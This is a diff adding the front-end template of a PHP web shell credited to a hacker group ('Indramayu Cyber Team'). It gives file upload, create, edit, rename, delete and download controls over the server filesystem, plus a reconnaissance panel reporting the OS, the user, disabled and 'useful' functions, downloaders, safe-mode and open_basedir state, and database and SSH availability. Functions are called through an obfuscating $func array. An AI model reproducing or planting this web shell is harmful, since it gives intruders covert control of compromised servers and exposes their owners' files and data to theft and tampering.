+		<?php if (isset($_SESSION['message'])) : ?>
+		<div class="alert alert-<?= $_SESSION['class'] ?> alert-dismissible fade show my-3" role="alert">
+			<strong><?= $_SESSION['status'] ?>!</strong> <?= $_SESSION['message'] ?>
+			<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+		</div>
+		<?php endif; clear(); ?>
+
+		<div id="tool">
+			<div class="d-flex justify-content-center flex-wrap my-3">
+				<a href="?" class="m-1 btn btn-outline-dark btn-sm"><i class="fa fa-home"></i> Home</a>
+				<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#upload" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-upload"></i> Upload</a>
+				<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#newfile" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-file-plus"></i> New File</a>
+				<a class="m-1 btn btn-outline-dark btn-sm" data-bs-toggle="collapse" href="#newfolder" role="button" aria-expanded="false" aria-controls="collapseExample"><i class="fa fa-folder-plus"></i> New Folder</a>
+			</div>
+			
+			<div class="row">
+				<div class="col-md-12">
+					<div class="collapse" id="upload" data-bs-parent="#tool">
+						<div class="card card-body border-dark mb-3">
+							<div class="row">
+								 <div class="col-md-6">
+									<form action="" method="post" enctype="multipart/form-data">
+										<div class="input-group">
+											<input type="file" class="form-control" name="uploadfile[]" id="inputGroupFile04" aria-describedby="inputGroupFileAddon04" aria-label="Upload">
+											<button class="btn btn-outline-dark" type="submit" id="inputGroupFileAddon04">Upload</button>
+										</div>
+									</form>
+								 </div>
+							</div>
+						</div>
+					</div>
+				</div>
+				<div class="col-md-12">
+					<div class="collapse" id="newfile" data-bs-parent="#tool">
+						<div class="card card-body border-dark mb-3">
+							<div class="row">
+								<div class="col-md-6">
+									<form action="" method="post">
+										<div class="mb-3">
+											<label class="form-label">File Name</label>
+											<input type="text" class="form-control" name="filename" placeholder="bibib.txt">
+										</div>
+										<div class="mb-3">
+											<label class="form-label">File Content</label>
+											<textarea class="form-control" rows="5" name="filecontent"></textarea>
+										</div>
+										<button type="submit" class="btn btn-outline-dark">Create</button>
+									</form>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+				<div class="col-md-12">
+					<div class="collapse" id="newfolder" data-bs-parent="#tool">
+						<div class="card card-body border-dark mb-3">
+							<div class="row">
+								<div class="col-md-6">
+									<form action="" method="post">
+										<div class="mb-3">
+											<label class="form-label">Folder Name</label>
+											<input type="text" class="form-control" name="foldername" placeholder="bibib">
+										</div>
+										<button type="submit" class="btn btn-outline-dark">Create</button>
+									</form>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+
+		<div class="row">
+			<div class="col-md-12">
+				<div class="card border-dark">
+					<div class="card-body">
+						<h5><i class="fa fa-server"></i> Server Information </h5>
+						<div class="table-responsive">
+							<table class="table table-hover text-nowrap">
+								<tr>
+									<td>Operating System</td>
+									<td> : <?= $uname ?></td>
+								</tr>
+								<tr>
+									<td>User / Group</td>
+									<td> : <?= $uid ?>[<?= $user ?>] / <?= $gid ?>[<?= $group ?>]</td>
+								</tr>
+								<tr>
+									<td>PHP Version</td>
+									<td> : <?= $func[1]() ?></td>
+								</tr>
+								<tr>
+									<td>IP Server</td>
+									<td> : <?= (!@$_SERVER["SERVER_ADDR"] ? ($func[49]("gethostbyname") ? @gethostbyname($_SERVER['SERVER_NAME']) : '????') : @$_SERVER["SERVER_ADDR"]) ?></td>
+								</tr>
+								<tr>
+									<td>Storage</td>
+									<td class="d-flex">: Total = <?= formatSize($total) ?>, Free = <?= formatSize($free) ?> [<?= $pers ?>%]</td>
+								</tr>
+								<tr>
+									<td>Domains</td>
+									<td>: <?= $dom ?></td>
+								</tr>
+								<tr>
+									<td>Software</td>
+									<td>: <?= $_SERVER['SERVER_SOFTWARE'] ?></td>
+								</tr>
+								<tr>
+									<td>Disable Functions</td>
+									<td>: <?= $show_ds ?></td>
+								</tr>
+								<tr>
+									<td>Useful Functions</td>
+									<td>: <?= rtrim($useful, ', ') ?></td>
+								</tr>
+								<tr>
+									<td>Downloader</td>
+									<td>: <?= rtrim($downloader, ', ') ?></td>
+								</tr>
+								<tr>
+									<td colspan="2">CURL : <?= $func[49]('curl_version') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | SSH2 : <?= $func[49]('ssh2_connect') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | Magic Quotes : <?= $func[49]('get_magic_quotes_gpc') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | MySQL : <?= $func[49]('mysql_get_client_info') || class_exists('mysqli') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | MSSQL : <?= $func[49]('mssql_connect') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | PostgreSQL : <?= $func[49]('pg_connect') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | Oracle : <?= $func[49]('oci_connect') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?></td>
+								</tr>
+								<tr>
+									<td colspan="2">Safe Mode : <?= @$func[31]('safe_mode') ? '<font class="text-success">ON</font>' : '<font class="text-danger">OFF</font>' ?> | Open Basedir : <?= $open_b ?> | Safe Mode Exec Dir : <?= @$func[31]('safe_mode_exec_dir') ? '<font class="text-success">'. @$func[31]('safe_mode_exec_dir') .'</font>' : '<font class="text-warning">NONE</font>' ?> | Safe Mode Include Dir : <?= @$func[31]('safe_mode_include_dir') ? '<font class="text-success">'. @$func[31]('safe_mode_include_dir') .'</font>' : '<font class="text-warning">NONE</font>' ?></td>
+								</tr>
+							</table>
+						</div>
+					</div>
+				</div>
+			</div>
+			<div class="col-md-12 my-3">
+				<div class="card border-dark">
+					<div class="card-body">
+						<h5><i class="fa fa-wave-square"></i> Path </h5>
+						<nav aria-label="breadcrumb" style="--bs-breadcrumb-divider: '>';">
+							<ol class="breadcrumb">
+								<?php
+									$numDir = count($scdir);
+									foreach ($scdir as $id => $pat) {
+										if ($pat == '' && $id == 0) {
+											echo '<li class="breadcrumb-item"><a class="text-decoration-none text-dark" href="?dir=/">/</a></li>';
+											continue;
+										}
+										if ($pat == '') continue;
+										if ($id + 1 == $numDir) {
+											echo '<li class="breadcrumb-item active" aria-current="page">'.$pat.'</li>';
+										} else {
+											echo '<li class="breadcrumb-item"><a class="text-decoration-none text-dark" href="?dir=';
+											for ($i = 0; $i <= $id; $i++) {
+												echo "$scdir[$i]";
+												if ($i != $id) echo "/";
+											}
+											echo '">'.$pat.'</a></li>';
+										}
+									}
+								?>
+							</ol>
+						</nav>
+						[ <?= checkPerm($dir, perms($dir)) ?> ]
+					</div>
+				</div>
+			</div>
+			<div class="col-md-12" id="main">
+				<div class="card border-dark overflow-auto">
+					<div class="card-body">
+						<h5><i class="fa fa-<?= $icon ?>"></i> <?= $title ?></h5>
+						<?php if ($do == 'view') : ?>
+							<h1>Anjing</h1>
+						<?php else: ?>
+							<?php if ($func[9]($dir)) : ?>
+								<div class="table-responsive">
+									<table class="table table-hover text-nowrap">
+										<thead>
+											<tr>
+												<th>Name</th>
+												<th>Type</th>
+												<th>Size</th>
+												<th>Last Modified</th>
+												<th>Owner/Group</th>
+												<th>Permission</th>
+												<th>Action</th>
+											</tr>
+										</thead>
+										<tbody>
+											<?php
+												foreach ($scandir as $item) :
+													if (!$func[6]($dir . '/' . $item)) continue;
+											?>
+												<tr>
+													<td>
+														<?php if ($item === '..') : ?>
+														<a href="?dir=<?= $func[28]($dir); ?>" class="text-decoration-none text-dark"><i class="fa fa-folder-open"></i> <?= $item ?></a>
+														<?php elseif ($item === '.') :  ?>
+														<a href="?dir=<?= $dir; ?>" class="text-decoration-none text-dark"><i class="fa fa-folder-open"></i> <?= $item ?></a>
+														<?php else : ?>
+														<a href="?dir=<?= $dir . '/' . $item ?>" class="text-decoration-none text-dark"><i class="fa fa-folder"></i> <?= checkName($item); ?></a>
+														<?php endif; ?>
+													</td>
+													<td><?= $func[38]($item) ?></td>
+													<td class="align-middle">--</td>
+													<td><?= $func[19]("Y-m-d h:i:s", $func[20]($item)); ?></td>
+													<td><?= getowner($item) ?></td>
+													<td><?= checkPerm($dir . '/' . $item, perms($dir . '/' . $item))  ?></td>
+													<td>
+														<button type="button" class="btn btn-outline-dark btn-sm mr-1" <?= $item === ".." || $item === "." ? '' : 'data-bs-toggle="modal" data-bs-target="#renameModal" data-bs-name="'.$item.'"' ?>><i class="fa fa-edit"></i></button>
+														<button type="button" class="btn btn-outline-dark btn-sm mr-1" <?= $item === ".." || $item === "." ? '' : 'data-bs-toggle="modal" data-bs-target="#deleteModal" data-bs-file="'.$dir . '/' . $item.'"'?>><i class="fa fa-trash-alt"></i></button>
+													</td>
+												</tr>
+											<?php endforeach; ?>
+											<?php
+												foreach ($scandir as $item) :
+													if (!$func[7]($dir . '/' . $item)) continue;
+											?>
+												<tr>
+													<td><a data-bs-toggle="modal" href="#viewModal" role="button" data-bs-name="<?= $item ?>" data-bs-content="<?= $func[18](@$func[14]($item)) ?>" class="text-dark text-decoration-none"><i class="fa fa-<?= geticon($item) ?>"></i> <?= checkName($item); ?></a></td>
+													<td><?= checkName(($func[49]('mime_content_type') ? $func[63]($item) : $func[38]($item))) ?></td>
+													<td><?= formatSize($func[10]($item)) ?></td>
+													<td><?= $func[19]("Y-m-d h:i:s", $func[20]($item)); ?></td>
+													<td><?= getowner($item) ?></td>
+													<td><?= checkPerm($dir . '/' . $item, perms($dir . '/' . $item))  ?></td>
+													<td>
+														<button type="button" class="btn btn-outline-dark btn-sm mr-1" data-bs-toggle="modal" data-bs-target="#renameModal" data-bs-name="<?= $item ?>"><i class="fa fa-edit"></i></button>
+														<button type="button" class="btn btn-outline-dark btn-sm mr-1" data-bs-toggle="modal" data-bs-target="#viewModal" data-bs-name="<?= $item ?>" data-bs-content="<?= $func[18](@$func[14]($item)) ?>"><i class="fa fa-file-signature"></i></button>
+														<button type="button" class="btn btn-outline-dark btn-sm mr-1" data-bs-toggle="modal" data-bs-target="#downloadModal" data-bs-file="<?= $dir . '/' . $item ?>"><i class="fa fa-download"></i></button>
+														<button type="button" class="btn btn-outline-dark btn-sm mr-1" data-bs-toggle="modal" data-bs-target="#deleteModal" data-bs-file="<?= $dir . '/' . $item ?>"><i class="fa fa-trash-alt"></i></button>
+													</td>
+												</tr>
+											<?php endforeach; ?>
+										</tbody>
+									</table>
+								</div>
+							<?php else: ?>
+								<font class="text-danger">Can't read this directory!</font>
+							<?php endif; ?>
+						<?php endif; ?>
+					</div>
+				</div>
+			</div>
+			<div class="col-md-12 my-3">
+				<div class="card border-dark">
+					<div class="card-body">
+						Copyright © Indramayu Cyber Team <span class="float-end">Coded by <span class="text-muted">Bibib</span></span>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	
+	<div class="modal fade" id="renameModal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="renameModalLabel" aria-hidden="true">
+	  <div class="modal-dialog modal-dialog-centered">
+	    <div class="modal-content">
+	      <div class="modal-header">
+	        <h5 class="modal-title" id="renameModalLabel">Rename</h5>
+	        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+	      </div>
+	      <form method="post" id="rename-form">
+		      <div class="modal-body">
+		          <div class="mb-3">
+		            <label for="newname" class="col-form-label">New Name:</label>
+		            <input type="text" class="form-control" name="newname" id="newname">
+		          </div>
+		      </div>
+		      <div class="modal-footer">
+		        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+		        <button type="submit" class="btn btn-primary">Rename</button>
+		      </div>
+        </form>
+	    </div>
+	  </div>
+	</div>
+	
+	<div class="modal fade" id="deleteModal" aria-hidden="true" aria-labelledby="deleteModalToggleLabel2" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1">
+	  <div class="modal-dialog modal-dialog-centered">
+	    <div class="modal-content">
+	      <div class="modal-header">
+	        <h5 class="modal-title" id="exampleModalToggleLabel2">Delete</h5>
+	        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+	      </div>
+	      <div class="modal-body">
+	        Are you sure want to delete this?
+	      </div>
+	      <div class="modal-footer">
+	        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+	        <a href="" class="btn btn-danger" id="delete-confirm">Delete</a>
+	      </div>
+	      
+	    </div>
+	  </div>
+	</div>
+	
+	<div class="modal fade" id="downloadModal" aria-hidden="true" aria-labelledby="deleteModalToggleLabel2" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1">
+	  <div class="modal-dialog modal-dialog-centered">
+	    <div class="modal-content">
+	      <div class="modal-header">
+	        <h5 class="modal-title" id="exampleModalToggleLabel2">Download</h5>
+	        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+	      </div>
+	      <div class="modal-body">
+	        Are you sure want to download this?
+	      </div>
+	      <div class="modal-footer">
+	        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+	        <a href="" class="btn btn-danger" id="download-confirm">Download</a>
+	      </div>
+	      
+	    </div>
+	  </div>
+	</div>
+	
+	<div class="modal fade" id="viewModal" aria-hidden="true" aria-labelledby="deleteModalToggleLabel2" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1">
+	  <div class="modal-dialog modal-dialog-centered">
+	    <div class="modal-content">
+	      <div class="modal-header">
+	        <h5 class="modal-title" id="exampleModalToggleLabel2">View</h5>
+	        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+	      </div>
+	      <form action="" method="post">
+		      <div class="modal-body">
+		        <div class="mb-3">
+	            <label for="content" class="col-form-label">Content:</label>
+	            <textarea class="form-control" id="content" rows="15" name="content"></textarea>
+	          </div>
+		      </div>
+		      <div class="modal-footer">
+		        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+		        <button type="submit" class="btn btn-primary">Save</button>
+		      </div>
+	      </form>
+	    </div>
+	  </div>
+	</div>
+	
+	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-gtEjrD/SeCtmISkJkNUaaKMoLD0//ElJ19smozuHV6z3Iehds+3Ulb9Bn9Plx0x4" crossorigin="anonymous"></script>
+	<script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+	<script>
+		var renameModal = document.getElementById('renameModal')
+		var deleteModal = document.getElementById('deleteModal')
+		var viewModal = document.getElementById('viewModal')
+		var downloadModal = document.getElementById('downloadModal')
+		
+		renameModal.addEventListener('show.bs.modal', function (event) {
+			var button = event.relatedTarget
+			var name = button.getAttribute('data-bs-name')
+			var modalTitle = renameModal.querySelector('.modal-title')
+			var modalBodyInput = renameModal.querySelector('.modal-body input')
+			var hiddenInput = document.createElement('input')
+			hiddenInput.type = "hidden";
+			hiddenInput.value = name;
+			hiddenInput.name = "oldname";
+			document.getElementById("rename-form").appendChild(hiddenInput);
+			
+			modalBodyInput.value = name
+		})
+		
+		deleteModal.addEventListener('show.bs.modal', function (event) {
+			var button = event.relatedTarget
+			var file = button.getAttribute('data-bs-file')
+			var deleteConfirm = document.getElementById('delete-confirm')
+			deleteConfirm.href = '?dir=' + file + '&do=delete'
+		})
+		
+		downloadModal.addEventListener('show.bs.modal', function (event) {
+			var button = event.relatedTarget
+			var file = button.getAttribute('data-bs-file')
+			var downloadConfirm = document.getElementById('download-confirm')
+			downloadConfirm.href = '?dir=' + file + '&do=download'
+		})
+		
+		viewModal.addEventListener('show.bs.modal', function (event) {
+			var button = event.relatedTarget
+			var content = button.getAttribute('data-bs-content')
+			var name = button.getAttribute('data-bs-name')
+			var modalTitle = viewModal.querySelector('.modal-title')
+			var modalContent = viewModal.querySelector('.modal-body textarea')
+			var hiddenInput = document.createElement('input')
+			hiddenInput.type = "hidden";
+			hiddenInput.value = name;
+			hiddenInput.name = "filename";
+			viewModal.querySelector("form").appendChild(hiddenInput);
+
+			modalTitle.textContent = 'Edit ' + name
+			modalContent.value = content
+		})
+	</script>
 </body>
 </html>
